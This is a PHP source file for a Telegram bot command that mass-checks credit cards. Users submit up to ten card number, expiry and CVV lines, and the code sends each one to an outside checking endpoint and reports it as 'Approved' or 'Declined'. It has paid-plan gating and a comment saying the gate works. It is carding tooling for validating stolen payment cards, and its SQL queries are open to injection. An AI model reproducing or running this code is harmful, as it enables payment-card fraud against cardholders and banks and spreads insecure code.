<?php

require_once '/home/alvcarr230/www/project/data/data.php';
list($cmd) = explode(" ", $text);
if($cmd == "/mass" or $cmd == ".mass" or $cmd == "!mass" or $cmd == "?mass" or $cmd == "#mass" or $cmd == ":mass" or $cmd == ",mass"){ 
    
    if(!noAutorizado($user_id)){
// A part for gatecmd clearance
    if($cmd == '/mass'){
        $gatecmd = "mass";
    }elseif($cmd == ".mass"){
        $gatecmd = "mass";
    }elseif($cmd == "!mass"){
        $gatecmd = "mass";
    }elseif($cmd == "?mass"){
        $gatecmd = "mass";
    }elseif($cmd == "#mass"){
        $gatecmd = "mass";
    }elseif($cmd == ":mass"){
        $gatecmd = "mass";
    }elseif($cmd == ",mass"){
        $gatecmd = "mass";
    }
    $listan = clean($text);
$listaq = clean($quetzal);
if(empty($listan)){
$lista = $listaq;
}elseif(empty($listaq)){
$lista = $listan;
}
/*$content = ['chat_id' => $chat_id, 'text' => "$lista", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        SendMessage($content);
        exit();*/
error_reporting(0);
unlink(getcwd().'/cookie.txt');
    
//-------------[ MYSQL CALL PART] ----_-----//

    $sql = "SELECT * FROM administrar WHERE id='$user_id'";
    $cs = mysqli_query(mysqlcon(),$SQL);
    $raw = mysqli_fetch_assoc($cs);
    $planexpiry = $raw['planexpiry'];
     mysqli_close(mysqlcon());


    $sql = "SELECT * FROM gateway WHERE gatecmd='$gatecmd'";
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $gatec = $raw['gatecmd'];
     mysqli_close(mysqlcon());


    $sql = "SELECT * FROM gateway WHERE gatecmd='mass'";
        $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $status = $raw['status'];
     mysqli_close(mysqlcon());

    
    $sql = "SELECT * FROM administrar WHERE id='$user_id'";
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $plan = $raw['plan'];
     mysqli_close(mysqlcon());
    

$sql = "SELECT * FROM `authorize` WHERE chats=".$chat_id;
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $chats = $raw['chats'];
    $now = time();
    
    /* This part for condition of gateways and some others*/
    if($status == "OFF"){
        $content = ['chat_id' => $chat_id, 'text' => "𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑶𝒇𝒇 ❌ ", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        SendMessage($content);
        exit();
    }
    
    
    if($gatec != $gatecmd){
        $content = ['chat_id' => $chat_id, 'text' => "$gate_not_added", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
      if ($planexpiry < $now && $planexpiry == 0) {
    }
elseif ($planexpiry < $now && $plan != "Free User") {
    
    $sql = "UPDATE `administrar` SET `plan` = 'Free User' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    mysqli_close(mysqlcon());
    
    $sql = "UPDATE `administrar` SET `planexpiry` = '0' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    mysqli_close(mysqlcon());
    $content = ['chat_id' => $chat_id, 'text' => "$premium_expired", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
    
    if($chats != $chat_id and $ctype == "supergroup"){
        $content = ['chat_id' => $chat_id, 'text' => "$group_not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    }
    else{}

    $SQL = "SELECT * FROM `administrar` WHERE plan=".$plan;
    if(empty($plan)){
        $content = ['chat_id' => $chat_id, 'text' => "$not_registered", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    if($plan == "Free User" and $ctype == "private"){
        $content = ['chat_id' => $chat_id, 'text' => "$not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    $SQL = "SELECT * FROM `administrar` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);

    if($f > 0)
    {} else{
        $content = ['chat_id' => $chat_id, 'text' => "$not_registered", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit;
    }
    // if($plan == "Free User"){
    //     $content = ['chat_id' => $chat_id, 'text' => "$not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    //         $m1  = SendMessage($content);
    //         exit();
    // }
    // else{}
   
$message = substr($text, 6);


 function gibarray($message){
    // $cuted = substr($message, 6);
    return explode("\n", $message);
}
 $aray = gibarray($message);
    $cout = count($aray);
    $total = $cout * 5;
    if (count($aray) > 10){
    $content = ['chat_id' => $chat_id, 'text' => "<b>Solo 10 CCs</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    SendMessage($content);
    exit();
    }
    if(empty($message)){
            $message = substr($message, 1, 9);
    $content = ['chat_id' => $chat_id, 'text' => "<b>
Mensaje invalido! 

Ex: /mass TusCcs
    </b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    SendMessage($content);
                exit;
}

    global $fullmes;
      $fullmes = '';
	  echo '<pre>'; print_r($aray); echo '</pre>';

 


$comienzo= microtime(true);



    $SQL = "SELECT * FROM `administrar` WHERE id=".$user_id;
        $c = mysqli_query(mysqlcon(),$SQL);
        

         
 $RAW = mysqli_fetch_assoc($c);
        $ANTISPAM = $RAW['antispam'];
        $Rango = $RAW['rango'];
        $antispam2 = $RAW['antispam2'];
     $time =   str_replace('s','',$antispam2);
        $TIMEAC = time() - $ANTISPAM;
        if($TIMEAC < $time)
        {
            $TotalTime = $time - $TIMEAC;
            if($TotalTime > 0){
            $content = ['chat_id' => $chat_id, 'text' => "<b>[ANTISPAM] Try again after $TotalTime's</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit;
            }
        }
        

        
          $timest = time();
        $SQL = "UPDATE administrar SET antispam = '$timest' WHERE id=".$user_id;
        $CONSULTA = mysqli_query(mysqlcon(),$SQL);
        
        
          
        $content = ['chat_id' => $chat_id, 'text' => "okay", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
      $m1  = SendMessage($content);
        $m1i = $m1['result']['message_id'];
        
         $comienzo= microtime(true);


         
   foreach ($aray as $lista){
      echo "Checking : $lista <br>";
     
   
   if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista)) {
           $cc = multiexplode(array(":", "|", "/", " "), $lista)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $lista)[1];
            $year = multiexplode(array(":", "|", "/", " "), $lista)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $lista)[3]; 
   }
   
    /*  $separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$year  = $separa[2];
$cvv = $separa[3];
*/
  
/////////////// CAPTURAR CC
 $values = "$cc|$mes|$year|$cvv";
 $fi = json_decode(file_get_contents("https://juaneloapp.azurewebsites.net/makima/unk/unk2.php?lista=$values"));
$m = $fi->m;

if($m == 'Invalid card verification number.') {
    $ccresult = 'Approved✅';
  }else{
        $ccresult = 'Declined❌';
  }



$tecode = "-------------------------";
$fullmes = "".$ccresult."\n<code>CC:".$fullmes.$lista."</code>\nResponse:<code> ".$m."</code>\n-------------------------\n";

$content2 = ['chat_id' => $chat_id, 'text' => "<b>MassChk\n-----------------------------\n".$fullmes."⎆𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲» @$username </b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
 EditMessageText($content2);
  



 //echo $fullmes.'<br>';
  //return $ccresult;
  //$final= microtime(true);
  /////////// 1

}
exit;

   
   
   
   
   
    }
}

/// no tocar mas este gate, esta funcionando
?>